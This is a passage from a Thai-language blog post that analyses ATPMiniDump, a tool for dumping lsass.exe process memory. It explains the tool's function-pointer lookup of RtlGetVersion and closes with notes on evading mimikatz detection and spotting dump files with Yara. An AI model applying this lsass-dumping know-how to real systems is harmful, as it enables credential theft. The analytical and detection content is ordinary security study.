ผลลัพธ์ที่ได้จากการเรียกใช้ฟังก์ชัน `GetModuleHandle()` และฟังก์ชัน `GetProcAddress()` คือตำแหน่งของฟังก์ชัน `RtlGetVersion()` ในหน่วยความจำ อย่างไรก็ตามเพื่อให้โค้ดของโปรแกรมสามารถเรียกใช้ฟังก์ชัน `RtlGetVersion()` ได้ การรู้เพียงแค่ว่าฟังก์ชัน `RtlGetVersion()` นั้นอยู่ที่ไหนนั้นไม่เพียงพอ เพราะโดยทั่วไปนั้นโค้ดซึ่งจะทำหน้าที่เป็นฟังก์ชันจะต้องมีส่วนประกอบส่วนอื่นอีกที่จำเป็น อาทิ ประเภทของผลลัพธ์ที่ฟังก์ชันจะส่งออกมาเมื่อทำงานจนเสร็จสิ้น หรืออากิวเมนต์ จำนวนอากิวเมนต์และประเภทอากิวเมนต์นำเข้าที่ฟังก์ชันดังกล่าวจะรับเข้ามาประมวลผล เราจึงจำเป็นต้องเพิ่ม**กลไก**ที่จะเข้ามามีบทบาทเพื่อช่วยรวบรวมโครงสร้างของฟังก์ชันให้สมบูรณ์

```cpp
_RtlGetVersion RtlGetVersion = (_RtlGetVersion) 0x12345678
```

ถ้าเราสมมติว่าผลลัพธ์ของ `GetModuleHandle()` และ `GetProcAddrss()` นั้นคือ `0x12345678` ซึ่งก็คือตำแหน่งของ `RtlGetVersion()` ในหน่วยความจำ สิ่งที่เกิดขึ้นต่อมาคือการเปลี่ยนการทำ type casting ค่า `0x12345678` ให้เป็นประเภทเฉพาะที่เรากำหนดไว้ก่อนแล้วซึ่งในที่นี้คือ `_RtlGetVersion` ก่อนจะนำผลลัพธ์ที่ได้ไปกำหนดให้กับตัวแปร `RtlGetVersion` ที่เป็นตัวแปรประเภท `_RtlGetVersion` เช่นกัน

พอถึงจุดนี้เราอาจจะงงว่า `_RtlGetVersion` ซึ่งเป็นประเภทของตัวแปรมันมาจากไหนและมีที่มาอย่างไร คำตอบสำหรับคำถามนี้จะอยู่ในไฟล์ [`ATPMiniDump.h` ที่บรรทัดที่ 114](https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.h#L114) ครับ

```cpp
typedef NTSTATUS(NTAPI *_RtlGetVersion)(
	LPOSVERSIONINFOEXW lpVersionInformation
);
```

คำว่า `typedef` เป็นคีย์เวิร์ดในภาษาซีซึ่งทำให้เราสามารถกำหนดชื่อ (alias) ให้กับประเภทของข้อมูลได้ในไวยากรณ์คือ `typedef type-definition alias` เช่น `typedef int length` คือการสร้างประเภทใหม่ชื่อ `length` จากประเภทจำนวนเต็ม (`int`) ดังนั้นจากโค้ดในไฟล์ `ATPMiniDump.h` ด้านบน เราสามารถอธิบายมันได้เป็นการสร้างประเภทของข้อมูลใหม่ในชื่อ `_RtlGetVersion` จากประเภท `NTSTATUS` ซึ่งเป็นประเภทของข้อมูลหนึ่งในระบบปฏิบัติการ Windows อย่างไรก็ตามการใช้ `typedef` ในลักษณะนี้ไม่ได้เป็นเพียงแค่การสร้างชื่อใหม่กับประเภทของข้อมูลเดิม แต่เป็นการใช้ `typedef` เพื่อสร้างสิ่งที่เราจะเรียกมันว่า **function pointer**

**Function pointer** เป็นเหมือนเงาของฟังก์ชันที่แท้จริง เมื่อ function pointer ถูกเรียกใช้งานมันจะรับอากิวเมนต์ที่มีประเภทและจำนวนตามที่ฟังก์ชันซึ่งมันชี้อยู่ต้องการ ก่อนจะส่งอากิวเมนต์เหล่านั้นไปยังตำแหน่งในหน่วยความจำซึ่งฟังก์ชันที่แท้จริงอยู่ ในส่วนของวิธีการลำดับการส่งและการล้างอากิวเมนต์นั้น กระบวนการเหล่านี้จะถูกกำหนดด้วย [calling convention](https://en.wikipedia.org/wiki/X86_calling_conventions) ซึ่งจะถูกระบุไว้ที่ตัว function pointer เช่นเดียวกัน

ดังนั้นจากโค้ด `typedef` ด้านบน เราจะเห็นการสร้างประเภทของข้อมูลใหม่ในชื่อ `_RtlGetVersion` จากประเภท `NTSTATUS` โดยมี `NTAPI` ซึ่งเป็น calling convetion ที่มีรากเหง้าคือ `__stdcall` มาประกอบและช่วยให้รู้ว่าพารามิเตอร์หรืออากิวเมนต์ควรถูกจัดเรียงและถูกจัดการอย่างไร ส่วนสุดท้ายคือการรับพารามิเตอร์ซึ่งเราจะเห็นว่าใน `typedef` ของเรานั้นจะมีการรับพารามิเตอร์ `lpVersionInformation` ซึ่งมีประเภทเป็น `LPOSVERSIONINFOEX` เข้าไป

```cpp
_RtlGetVersion RtlGetVersion = (_RtlGetVersion)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetVersion");

if (RtlGetVersion == NULL) {
		return FALSE;
}
```

ผลสุดท้ายตัวแปร `RtlGetVersion` ในประเภท `_RtlGetVersion` ก็สามารถที่จะถูกใช้ได้เสมอกับเรานำเข้าฟังก์ชัน `RtlGetVersion()` จาก `ntdll.dll` มาใช้งานเอง หากใครเห็นลักษณะโค้ดในด้านบนจากในโครงนี้อีก รวมไปถึงเงื่อนไขซึ่งถูกเพิ่มเข้ามาเพื่อช่วยตรวจสอบว่ากระบวนการนำเข้าฟังก์ชันจากไลบรารีข้างนอกนั้นสำเร็จไหม ให้คิดทันทีว่านี่เป็นลักษณะของการใช้ function pointer ครับ

# Final Notes

- แม้ว่าไฟล์ไบนารีของโปรแกรม mimikatz จะถูกตรวจจับและถูกระบุเป็นโปรแกรมอันตรายได้โดยเทคโนโลยีตรวจจับมัลแวร์โดยส่วนใหญ่ การสร้างไฟล์ข้อมูลที่มีการจัดเก็บข้อมูลในหน่วยความจำของโปรเซส `lsass.exe` มักเป็นเทคนิคที่สามารถใช้เพื่อหลบหลีกการตรวจจับได้ โดยกระบวนการ process memory dumping ยังสามารถทำได้ผ่านทางเครื่องมือทั่วไปของระบบ อาทิ โปรแกรม Task Manager หรือโปรแกรมอีกหลายโปรแกรมในชุดโปรแกรม Sysinternals ของ Microsoft ด้วย
- อย่างไรก็ตามเงื่อนไขสำคัญของการทำ process memory dumping ในลักษณะนี้คือความจำเป็นของการต้องสร้างไฟล์ในระบบ ดังนั้นการตรวจหาพฤติกรรมผิดปกติโดยการตรวจหาไฟล์ที่ต้องสงสัยว่าจะเป็นไฟล์ที่เกิดขึ้นจากโปรเซส `lsass.exe` ผ่านเทคนิคต่างๆ เช่น การทำ binary pattern matching ด้วย Yara ก็อาจสามารถช่วยระบุความผิดปกติได้